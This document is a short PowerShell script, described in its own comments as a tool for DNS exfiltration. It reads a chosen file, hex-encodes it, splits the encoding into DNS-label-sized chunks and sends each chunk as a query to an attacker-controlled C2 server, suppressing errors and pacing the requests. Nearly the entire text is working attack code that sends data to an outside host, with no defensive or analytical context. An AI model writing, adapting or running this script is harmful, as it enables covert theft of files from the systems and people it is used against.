# PowerShell script for DNS exfiltration.
# This script encodes data into DNS queries to exfiltrate it to a C2 server.

param (
    [string]$FilePath,
    [string]$C2Server
)

# Read the file content
$fileContent = Get-Content -Path $FilePath -Raw
$bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$hexString = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""

# Split the hex string into chunks
$chunkSize = 63 # Max length for a DNS label
$chunks = ($hexString -split "(.{$chunkSize})").Trim() | Where-Object { $_ }

# Exfiltrate each chunk
foreach ($chunk in $chunks) {
    $query = "$chunk.$C2Server"
    try {
        Resolve-DnsName -Name $query -ErrorAction SilentlyContinue
    } catch {
        # Ignore errors
    }
    Start-Sleep -Milliseconds 100
}
